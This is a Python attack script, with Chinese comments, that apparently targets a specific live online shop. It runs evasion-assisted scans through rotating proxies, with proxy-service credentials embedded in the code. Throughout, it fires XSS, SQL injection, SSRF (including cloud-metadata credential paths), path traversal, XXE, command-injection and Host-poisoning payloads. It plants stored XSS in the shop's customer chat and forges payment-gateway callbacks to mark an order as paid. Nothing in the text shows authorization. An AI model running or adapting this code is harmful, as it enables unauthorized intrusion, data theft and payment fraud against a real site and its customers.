#!/usr/bin/env python3
"""
hmjf.lol 全类型漏洞穷尽扫描 v7
覆盖: XSS/SQLi/SSRF/LFI/重定向/CORS/会话/注入/业务逻辑/信息泄露/编码旁路 等
"""
import json, os, re, subprocess, time, urllib.parse, hashlib, random, string

BASE = "https://hmjf.lol/shop"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/vuln_exhaust_20260716")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
CK = f"{OUT}/.cookies"
os.makedirs(OUT, exist_ok=True)

R = {
    "critical": [], "high": [], "medium": [], "low": [], "info": [],
    "categories": {}, "tests": {}, "requests": 0,
}

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1)

def go(url, post=None, method=None, hdr=None, cookie=None, timeout=16, json_body=None):
    global R
    R["requests"] += 1
    if R["requests"] % 80 == 0:
        refresh()
    c = ["curl", "-s", "-i", "-w", "\n__C:%{http_code}__T:%{time_total}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX, "-b", cookie or CK, "-c", CK]
    if method:
        c += ["-X", method]
    if hdr:
        for k, v in hdr.items():
            c += ["-H", f"{k}: {v}"]
    if json_body is not None:
        c += ["-X", "POST", "-d", json_body, "-H", "Content-Type: application/json"]
    elif post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(6)
            refresh()
            return go(url, post, method, hdr, cookie, timeout, json_body)
        m = re.search(r"__C:(\d+)__T:([0-9.]+)__", raw)
        body = raw[:m.start()] if m else raw
        code = int(m.group(1)) if m else 0
        elapsed = float(m.group(2)) if m else 0
        # split headers/body
        if "\r\n\r\n" in body:
            hdrs, content = body.split("\r\n\r\n", 1)
        elif "\n\n" in body:
            hdrs, content = body.split("\n\n", 1)
        else:
            hdrs, content = "", body
        return content, code, elapsed, hdrs
    except Exception as e:
        return str(e), 0, 0, ""

def add(cat, level, title, detail):
    entry = {"category": cat, "title": title, **detail}
    R[level].append(entry)
    R["categories"].setdefault(cat, []).append(entry)
    print(f"[{level.upper()}][{cat}] {title}", flush=True)

def save():
    R["summary"] = {k: len(R[k]) for k in ["critical", "high", "medium", "low", "info"]}
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

def sess():
    go(f"{BASE}/")
    go(f"{BASE}/?mod=buy&tid=72")

def csrf():
    page, _, _, _ = go(f"{BASE}/?mod=buy&tid=72")
    m = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
    return m.group(1) if m else ""

# ══════════════════════════════════════════
print("=" * 50, flush=True)
print("[A] 信息泄露 / 敏感文件", flush=True)
# ══════════════════════════════════════════
LEAK_PATHS = []
NAMES = """config.php config.inc.php database.php db.php settings.php
common.php function.php autoload.php .env .git/HEAD .git/config .svn/entries
composer.json composer.lock package.json webpack.config.js
phpinfo.php info.php test.php debug.php p.php 1.php shell.php
backup.zip backup.sql dump.sql shop.zip www.zip site.tar.gz data.zip
.env.bak config.php.bak config.php~ config.php.old config.php.save
ajax.php.bak api.php.bak install.lock.bak
runtime/logs/ storage/logs/ logs/error.log log.txt debug.log
.swp .DS_Store crossdomain.xml robots.txt sitemap.xml security.txt
assets/faka/js/faka.js.map assets/*.map
user/config.php includes/config.php includes/common.php""".split()
for base in ["", "other/", "user/", "install/", "assets/", "assets/faka/", "template/", "includes/"]:
    for name in NAMES:
        name = name.strip()
        if name:
            LEAK_PATHS.append(f"{BASE}{name}")

for p in LEAK_PATHS:
    url = f"{BASE}/{p}".replace("//", "/").replace("https:/", "https://")
    if not url.startswith("http"):
        url = f"{BASE}/{p}"
    body, code, _, hdrs = go(url)
    key = f"leak:{p}"
    R["tests"][key] = {"code": code, "len": len(body), "snip": body[:100]}
    bl = body.lower()
    if code == 200 and any(x in bl for x in ["php version", "root:", "db_pass", "sys_key", "db_host", "create table"]):
        add("info_disclosure", "critical", f"敏感泄露 {p}", {"snippet": body[:300]})
    if ".git" in p and "ref:" in body:
        add("info_disclosure", "critical", ".git泄露", {"path": p})
    if code == 200 and p.endswith((".sql", ".zip", ".tar.gz")) and len(body) > 500:
        add("info_disclosure", "high", f"备份文件 {p}", {"size": len(body)})
    time.sleep(0.04)
save()

# JS secrets
body, _, _, _ = go(f"{BASE}/assets/faka/js/faka.js")
for pat in [r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)',
            r'secret["\']?\s*[:=]\s*["\']([^"\']+)',
            r'password["\']?\s*[:=]\s*["\']([^"\']+)',
            r'[a-f0-9]{32}']:
    for m in re.finditer(pat, body, re.I):
        val = m.group(1) if m.lastindex else m.group(0)
        if len(val) > 8 and val not in ("csrf_token",):
            add("info_disclosure", "medium", "JS中可疑密钥串", {"match": val[:60]})
            break
save()

# ══════════════════════════════════════════
print("[B] XSS 反射/存储", flush=True)
# ══════════════════════════════════════════
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '{{7*7}}',  # SSTI probe
    '${7*7}',
    '<iframe src=javascript:alert(1)>',
    '"><details open ontoggle=alert(1)>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '<img src=x onerror=alert`1`>',
    '"><svg><animate onbegin=alert(1)>',
]
XSS_TARGETS = [
    ("reflected", f"{BASE}/?mod=so&kw={{}}"),
    ("reflected", f"{BASE}/?mod=query&data={{}}"),
    ("reflected", f"{BASE}/?mod=buy&tid=72&inputvalue={{}}"),
    ("reflected", f"{BASE}/?mod=fenlei&kw={{}}"),
    ("reflected", f"{BASE}/user/login.php?msg={{}}"),
    ("reflected", f"{BASE}/user/reg.php?ref={{}}"),
    ("reflected", f"{BASE}/?mod=order&orderid={{}}"),
    ("header", f"{BASE}/ajax.php?act=getcount"),
]
for label, url_tpl in XSS_TARGETS:
    for i, payload in enumerate(XSS_PAYLOADS[:8]):
        if "{}" in url_tpl:
            url = url_tpl.format(urllib.parse.quote(payload))
            body, code, _, _ = go(url)
        else:
            body, code, _, _ = go(url, hdr={"X-Forwarded-Host": payload, "User-Agent": payload})
        key = f"xss:{label}:{i}"
        R["tests"][key] = {"code": code, "waf": "拦截" in body or "危险字符" in body, "reflect": payload in body or payload.replace("%3C", "<") in body}
        if payload in body or (payload.startswith("<") and payload[1:8] in body):
            add("xss", "high", f"XSS反射 {label}", {"payload": payload[:50], "url": url_tpl[:80]})
        if "49" in body and payload == "{{7*7}}":
            add("ssti", "critical", f"SSTI {label}", {"payload": payload})
    time.sleep(0.05)

# stored XSS via chat
for payload in XSS_PAYLOADS[:6]:
    enc = urllib.parse.quote(payload)
    body, _, _, _ = go(f"{BASE}/user/ajax_chat.php?act=send", post=f"content={enc}")
    if '"code":0' in body and "成功" in body:
        add("xss", "high", "存储型XSS-客服send", {"payload": payload[:50]})
    elif "拦截" not in body and "危险" not in body and '"code":0' in body:
        add("xss", "medium", "客服send可能无过滤", {"payload": payload[:50], "resp": body[:100]})
    time.sleep(0.1)
save()

# ══════════════════════════════════════════
print("[C] SQL注入", flush=True)
# ══════════════════════════════════════════
SQLI = [
    "'", "''", "' OR '1'='1", "' OR 1=1-- ", "' UNION SELECT 1,2,3-- ",
    "1' AND SLEEP(3)-- ", "1 AND SLEEP(3)", "1'; WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- ",
    "admin'--", "1' ORDER BY 10-- ", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "1%df' OR 1=1--", "1'||(SELECT/**/version())||'",
]
SQLI_TARGETS = [
    ("query", f"{BASE}/?mod=query&data={{}}"),
    ("buy_tid", f"{BASE}/?mod=buy&tid={{}}"),
    ("buy_cid", f"{BASE}/?mod=buy&cid={{}}"),
    ("so", f"{BASE}/?mod=so&kw={{}}"),
    ("orderid", f"{BASE}/?mod=order&orderid={{}}"),
    ("getshop", f"{BASE}/other/getshop.php?trade_no={{}}"),
    ("submit", f"{BASE}/other/submit.php?type=alipay&orderid={{}}"),
    ("login", None),
    ("ajax_query", None),
]
sess()
csrf_t = csrf()
for name, url_tpl in SQLI_TARGETS:
    for payload in SQLI:
        if url_tpl:
            url = url_tpl.format(urllib.parse.quote(payload))
            body, code, elapsed, _ = go(url)
        elif name == "login":
            body, code, elapsed, _ = go(f"{BASE}/user/login.php",
                post=f"user={urllib.parse.quote(payload)}&pass=x&code=0000")
        else:
            body, code, elapsed, _ = go(f"{BASE}/ajax.php?act=query",
                post=f"type=1&qq={urllib.parse.quote(payload)}")
        key = f"sqli:{name}:{payload[:15]}"
        R["tests"][key] = {"elapsed": round(elapsed, 2), "waf": len(body) == 1106, "err": any(x in body.lower() for x in ["sql", "syntax", "mysql", "warning", "mysqli"])}
        if any(x in body.lower() for x in ["sql syntax", "mysql", "mysqli", "you have an error"]):
            add("sqli", "critical", f"SQLi报错 {name}", {"payload": payload, "snippet": body[:300]})
        if elapsed > 2.8 and "SLEEP" in payload.upper():
            add("sqli", "critical", f"SQLi时间盲注 {name}", {"payload": payload, "elapsed": elapsed})
        if "登录成功" in body or ("location" in body.lower() and "login" in name):
            add("sqli", "critical", f"SQLi登录绕过 {name}", {"payload": payload})
    time.sleep(0.03)
save()

# ══════════════════════════════════════════
print("[D] SSRF / 外部请求", flush=True)
# ══════════════════════════════════════════
SSRF_URLS = [
    "http://127.0.0.1/", "http://127.0.0.1:80/", "http://localhost/",
    "http://[::1]/", "http://0.0.0.0/", "http://0177.0.0.1/",
    "http://127.1/", "http://2130706433/", "http://0x7f000001/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "file:///etc/passwd", "dict://127.0.0.1:11211/",
    "gopher://127.0.0.1:6379/_INFO",
    f"https://hmjf.lol/shop/install/install.lock",
]
SSRF_POINTS = [
    ("getshareid", "url"),
    ("SharePoster", "url"),
    ("ajax_share", "url"),
]
sess()
for act, param in SSRF_POINTS:
    for u in SSRF_URLS:
        post = f"{param}={urllib.parse.quote(u)}&hashsalt=256&csrf_token={csrf_t}"
        body, code, _, _ = go(f"{BASE}/ajax.php?act={act}", post=post)
        key = f"ssrf:{act}:{u[:30]}"
        R["tests"][key] = {"code": code, "body": body[:120]}
        if any(x in body for x in ["ami-id", "root:", "instance-id", "安装锁", "meta-data"]):
            add("ssrf", "critical", f"SSRF成功 {act}", {"url": u, "resp": body[:200]})
        if '"code":0' in body and "songid" in body:
            add("ssrf", "high", f"SSRF可能 {act}", {"url": u, "resp": body[:150]})
    time.sleep(0.05)
save()

# ══════════════════════════════════════════
print("[E] LFI / 路径穿越", flush=True)
# ══════════════════════════════════════════
LFI = [
    "../../../etc/passwd", "....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd", "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd", "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "expect://id", "data://text/plain,<?php phpinfo();?>",
    "..\\..\\..\\windows\\win.ini",
]
LFI_TARGETS = [
    f"{BASE}/other/download.php?file={{}}",
    f"{BASE}/other/download.php?my={{}}",
    f"{BASE}/other/download.php?filename={{}}",
    f"{BASE}/?mod={{}}",
    f"{BASE}/assets/{{}}",
    f"{BASE}/template/{{}}",
    f"{BASE}/other/getshop.php?trade_no={{}}",
]
for url_tpl in LFI_TARGETS:
    for payload in LFI:
        url = url_tpl.format(urllib.parse.quote(payload))
        body, code, _, _ = go(url)
        if "root:" in body or "PD9waHA" in body or "[extensions]" in body:
            add("lfi", "critical", f"LFI {url_tpl[:40]}", {"payload": payload, "snippet": body[:200]})
        time.sleep(0.03)
save()

# ══════════════════════════════════════════
print("[F] 开放重定向", flush=True)
# ══════════════════════════════════════════
REDIR = ["http://evil.com", "//evil.com", "https://evil.com", "/\\evil.com",
         "https://hmjf.lol.evil.com", "javascript:alert(1)", "%0d%0aLocation: http://evil.com"]
REDIR_TARGETS = [
    f"{BASE}/other/epay_return.php?out_trade_no=1&url={{}}",
    f"{BASE}/other/epay_return.php?out_trade_no=1&redirect={{}}",
    f"{BASE}/user/login.php?redirect={{}}",
    f"{BASE}/user/login.php?returl={{}}",
    f"{BASE}/?mod=query&redirect={{}}",
    f"{BASE}/other/submit.php?type=alipay&orderid=20260716031453854&return={{}}",
]
for url_tpl in REDIR_TARGETS:
    for r in REDIR:
        url = url_tpl.format(urllib.parse.quote(r))
        body, code, _, hdrs = go(url)
        if "evil.com" in body or "evil.com" in hdrs or (code in (301, 302) and "evil" in hdrs.lower()):
            add("open_redirect", "medium", f"开放重定向", {"url": url[:100], "hdr": hdrs[:200]})
        time.sleep(0.04)
save()

# ══════════════════════════════════════════
print("[G] CORS / 安全头 / Cookie", flush=True)
# ══════════════════════════════════════════
origins = ["https://evil.com", "null", "https://hmjf.lol.evil.com", "https://www.hmjf.lol"]
for origin in origins:
    body, code, _, hdrs = go(f"{BASE}/ajax.php?act=getcount", post="",
                              hdr={"Origin": origin, "Access-Control-Request-Method": "POST"})
    if f"Access-Control-Allow-Origin: {origin}" in hdrs or "access-control-allow-origin: *" in hdrs.lower():
        add("cors", "high", f"CORS宽松 origin={origin}", {"headers": hdrs[:300]})
    time.sleep(0.05)

_, _, _, hdrs = go(f"{BASE}/")
checks = {
    "csp": "content-security-policy" in hdrs.lower(),
    "hsts": "strict-transport-security" in hdrs.lower(),
    "xfo": "x-frame-options" in hdrs.lower(),
    "xcto": "x-content-type-options" in hdrs.lower(),
}
for k, ok in checks.items():
    if not ok:
        add("headers", "low", f"缺少安全头 {k}", {})
if "httponly" not in hdrs.lower() or "secure" not in hdrs.lower():
    add("session", "medium", "Cookie标志可能不安全", {"headers": hdrs[:400]})
R["tests"]["security_headers"] = checks
save()

# ══════════════════════════════════════════
print("[H] 认证 / 会话 / 枚举", flush=True)
# ══════════════════════════════════════════
# user enumeration
for u in ["admin", "administrator", "test", "xuxin", "root", "nonexist_xyz_999"]:
    body, _, _, _ = go(f"{BASE}/user/login.php", post=f"user={u}&pass=wrongpass123&code=0000")
    body2, _, _, _ = go(f"{BASE}/user/findpwd.php", post=f"user={u}&email=test@test.com")
    R["tests"][f"enum:{u}"] = {"login": body[:80], "findpwd": body2[:80]}
    if "不存在" not in body2 and "成功" in body2:
        add("auth", "low", f"用户枚举 findpwd {u}", {"resp": body2[:100]})

# session fixation
body, _, _, hdrs1 = go(f"{BASE}/")
sid1 = re.search(r"PHPSESSID=([^;]+)", hdrs1)
go(f"{BASE}/user/login.php", post="user=admin&pass=x&code=0000")
_, _, _, hdrs2 = go(f"{BASE}/user/record.php")
sid2 = re.search(r"PHPSESSID=([^;]+)", hdrs2)
if sid1 and sid2 and sid1.group(1) == sid2.group(1):
    add("session", "medium", "会话固定-登录未轮换PHPSESSID", {})

# mysid predictability
mysids = []
for _ in range(3):
    _, _, _, h = go(f"{BASE}/")
    m = re.search(r"mysid=([a-f0-9]+)", h)
    if m:
        mysids.append(m.group(1))
R["tests"]["mysid_samples"] = mysids
save()

# ══════════════════════════════════════════
print("[I] 业务逻辑 / 参数污染", flush=True)
# ══════════════════════════════════════════
sess()
csrf_t = csrf()
# HPP / type juggling
logic_tests = [
    ("pay_hpp", f"tid=72&tid=1&num=1&hashsalt=256&csrf_token={csrf_t}&pay_type=alipay"),
    ("pay_array", f"tid[]=72&num[]=1&hashsalt=256&csrf_token={csrf_t}"),
    ("pay_json", None),
    ("getshop_hpp", None),
    ("order_neg_id", "id=-1&skey=" + "0" * 32),
    ("order_huge_id", "id=999999999&skey=" + "0" * 32),
    ("query_long", "qq=" + "1" * 500),
    ("chat_long", "content=" + "A" * 10000),
]
for name, post in logic_tests:
    if name == "pay_json":
        body, _, _, _ = go(f"{BASE}/ajax.php?act=pay", json_body='{"tid":72,"num":0,"money":0}')
    elif name == "getshop_hpp":
        body, _, _, _ = go(f"{BASE}/other/getshop.php?trade_no=1&trade_no=20260716031453854")
    else:
        act = "pay" if name.startswith("pay") else ("order" if "order" in name else ("query" if "query" in name else "send"))
        url = f"{BASE}/ajax.php?act={act}" if act != "send" else f"{BASE}/user/ajax_chat.php?act=send"
        body, _, _, _ = go(url, post=post)
    R["tests"][f"logic:{name}"] = body[:150]
    if "kminfo" in body.lower():
        add("logic", "critical", f"业务逻辑 {name}", {"resp": body[:200]})
    if '"code":0' in body and name.startswith("pay") and "trade" in body.lower():
        add("logic", "high", f"异常支付 {name}", {"resp": body[:200]})
    time.sleep(0.08)
save()

# ══════════════════════════════════════════
print("[J] CRLF / Host / 缓存投毒", flush=True)
# ══════════════════════════════════════════
crlf_payloads = ["%0d%0aSet-Cookie: hacked=1", "%0aX-Injected: true"]
for payload in crlf_payloads:
    body, code, _, hdrs = go(f"{BASE}/?mod=query&data={payload}")
    if "hacked=1" in hdrs or "X-Injected" in hdrs:
        add("crlf", "high", "CRLF注入", {"payload": payload})

for host in ["evil.com", "127.0.0.1", "localhost"]:
    body, code, _, hdrs = go(f"{BASE}/", hdr={"Host": host, "X-Forwarded-Host": host})
    if host in body and "hmjf" not in body[:50]:
        add("host_injection", "medium", f"Host投毒 {host}", {"snippet": body[:150]})
    body2, _, _, _ = go(f"{BASE}/user/findpwd.php", post="user=admin&email=a@b.com",
                         hdr={"Host": host})
    if f"@{host}" in body2 or host in body2:
        add("host_injection", "high", f"密码重置Host投毒 {host}", {"snippet": body2[:150]})
save()

# ══════════════════════════════════════════
print("[K] NoSQL / 命令注入 / XML", flush=True)
# ══════════════════════════════════════════
nosql = ['{"$gt":""}', '{"$ne":null}', "true, $where: '1==1'"]
for payload in nosql:
    body, _, _, _ = go(f"{BASE}/user/login.php", post=f"user={urllib.parse.quote(payload)}&pass=x&code=0")
    if "成功" in body:
        add("nosql", "critical", "NoSQL注入登录", {"payload": payload})

cmd = [";id", "|id", "`id`", "$(id)", "||id||"]
for payload in cmd:
    body, _, _, _ = go(f"{BASE}/ajax.php?act=query", post=f"qq={urllib.parse.quote(payload)}")
    if "uid=" in body:
        add("cmd_injection", "critical", "命令注入", {"payload": payload, "resp": body[:100]})

xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
body, _, _, _ = go(f"{BASE}/other/wxpay_notify.php", post=xxe,
                   hdr={"Content-Type": "application/xml"})
if "root:" in body:
    add("xxe", "critical", "XXE wxpay_notify", {"resp": body[:200]})
save()

# ══════════════════════════════════════════
print("[L] 速率限制 / DoS 探测", flush=True)
# ══════════════════════════════════════════
t0 = time.time()
ok = 0
for i in range(20):
    body, _, _, _ = go(f"{BASE}/user/ajax_chat.php?act=send", post=f"content=ratelimit{i}")
    if '"code":0' in body:
        ok += 1
elapsed = time.time() - t0
R["tests"]["rate_limit_chat"] = {"ok": ok, "total": 20, "elapsed": round(elapsed, 1)}
if ok >= 18:
    add("dos", "medium", f"客服send无速率限制 ({ok}/20)", {"elapsed": elapsed})
save()

# ══════════════════════════════════════════
print("[M] 支付回调全类型", flush=True)
# ══════════════════════════════════════════
tn = "20260716031453854"
sh, _, _, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
params = dict(re.findall(r'name="([^"]+)"\s+value="([^"]+)"', sh))
# wx xml forgery
wx_xmls = [
    f"<xml><out_trade_no>{tn}</out_trade_no><result_code>SUCCESS</result_code><return_code>SUCCESS</return_code></xml>",
    f"<xml><out_trade_no>{tn}</out_trade_no><result_code>SUCCESS</result_code><return_code>SUCCESS</return_code><sign>fake</sign></xml>",
]
for xml in wx_xmls:
    body, _, _, _ = go(f"{BASE}/other/wxpay_notify.php", post=xml,
                       hdr={"Content-Type": "application/xml"})
    R["tests"][f"wx_notify:{xml[:30]}"] = body[:100]
    gs, _, _, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
    if "未付款" not in gs and body:
        add("payment", "critical", "wxpay_notify绕过", {"resp": body[:100], "getshop": gs[:100]})

# qqpay notify if exists
for path in ["other/qqpay_notify.php", "other/notify_qqpay.php", "other/tenpay_notify.php"]:
    body, code, _, _ = go(f"{BASE}/{path}?out_trade_no={tn}&trade_state=SUCCESS")
    if code == 200 and len(body) > 0:
        R["tests"][f"qqnotify:{path}"] = body[:80]
save()

# ══════════════════════════════════════════
print("[N] 未授权接口全量复测", flush=True)
# ══════════════════════════════════════════
unauth_endpoints = [
    ("POST", f"{BASE}/ajax.php?act=getcount", ""),
    ("POST", f"{BASE}/ajax.php?act=getclass", ""),
    ("POST", f"{BASE}/ajax.php?act=gettoolnew", ""),
    ("POST", f"{BASE}/ajax.php?act=getleftcount", ""),
    ("GET", f"{BASE}/user/ajax_chat.php?act=get", None),
    ("POST", f"{BASE}/user/ajax_chat.php?act=send", "content=exhaust_probe"),
    ("GET", f"{BASE}/toollogs.php", None),
    ("GET", f"{BASE}/install/install.lock", None),
    ("GET", f"{BASE}/install/", None),
    ("GET", f"{BASE}/cron.php", None),
    ("GET", f"{BASE}/?mod=cart", None),
]
for method, url, post in unauth_endpoints:
    body, code, _, _ = go(url, post=post, method=method if post is None and method != "GET" else None)
    R["tests"][f"unauth:{url.split('/')[-1]}"] = {"code": code, "body": body[:120]}
save()

save()
print(f"\nDONE requests={R['requests']} summary={R['summary']}", flush=True)
for cat, items in sorted(R.get("categories", {}).items()):
    if items:
        print(f"  {cat}: {len(items)}", flush=True)
